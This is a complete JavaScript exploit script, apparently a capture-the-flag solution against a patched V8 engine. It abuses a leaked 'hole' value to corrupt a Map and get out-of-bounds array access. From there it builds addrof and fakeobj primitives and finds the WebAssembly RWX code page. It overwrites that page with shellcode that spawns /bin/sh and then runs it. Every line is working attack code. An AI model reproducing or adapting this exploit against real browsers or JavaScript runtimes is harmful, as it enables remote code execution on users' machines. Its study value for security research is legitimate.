s = new Set();

var buf = new ArrayBuffer(8);
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function ftoi(val) {
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n);
}

function itof(val) {
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}


map = new Map();
map.set(1, 1);
map.set(s.hole(), 1);
map.delete(s.hole());
map.delete(s.hole());
map.delete(1);
var arr = new Array(1.1, 1.1);


map.set(0x10, -1);
map.set(arr, 0xffff);


object_arr = new Array({}, {});
float_array = new Array(1.1, 2.2);

object_map = ftoi(arr[11]) & 0xffffffffn;
float_map = ftoi(arr[15]) & 0xffffffffn;

function addrof(o) {
    object_arr[0] = o;
    arr[11] = itof(float_map);
    ret = ftoi(object_arr[0]);
    arr[11] = itof(object_map);
    return ret & 0xffffffffn;
}

function fakeobj(a) {
    float_array[0] = itof(a);
    arr[15] = itof(object_map);
    ret = float_array[0];
    arr[15] = itof(float_map);
    return ret;
}


a = new Uint8Array([0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, 0x01, 0x08, 0x02, 0x60, 0x01, 0x7f, 0x00, 0x60, 0x00, 0x00, 0x02, 0x19, 0x01, 0x07, 0x69, 0x6d, 0x70, 0x6f, 0x72, 0x74, 0x73, 0x0d, 0x69, 0x6d, 0x70, 0x6f, 0x72, 0x74, 0x65, 0x64, 0x5f, 0x66, 0x75, 0x6e, 0x63, 0x00, 0x00, 0x03, 0x02, 0x01, 0x01, 0x07, 0x11, 0x01, 0x0d, 0x65, 0x78, 0x70, 0x6f, 0x72, 0x74, 0x65, 0x64, 0x5f, 0x66, 0x75, 0x6e, 0x63, 0x00, 0x01, 0x0a, 0x08, 0x01, 0x06, 0x00, 0x41, 0x2a, 0x10, 0x00, 0x0b]); /* simple helloworld I think. It just needs to be a valid wasm program */
mod = new WebAssembly.Module(a.buffer);
instance = new WebAssembly.Instance(mod, {imports: {imported_func() {}},});            

f = instance.exports.exported_func;

addr = addrof(instance);

control_array = [itof(float_map), 1.1, 1.2, 1.3];
fake_array = fakeobj(addrof(control_array) - 0x20n);

function fake_arr(a) {
    control_array[1] = itof((0x80n << 32n) | (a - 0x10n));
}

fake_arr(addr);
code_addr = ftoi(fake_array[13]);
print("wasm rwx code: 0x" + code_addr.toString(16));


abs_array = new Uint8Array(64);
abs_array_addr = addrof(abs_array);


function abs_fake_arr(a) {
    b = ((a & 0xffffffffn) << 32n) | (a >> 32n);
    fake_arr(abs_array_addr);
    fake_array[7] = itof(b);
}

abs_fake_arr(code_addr - 7n);


shellcode = [0x48, 0xb8, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 0x50, 0x48, 0x89, 0xe7, 0x31, 0xf6, 0x31, 0xd2, 0xb8, 0x3b, 0x00, 0x00, 0x00, 0x0f, 0x05];

for (let i = 0; i < shellcode.length; i++) {
    abs_array[i] = shellcode[i];
}
f();
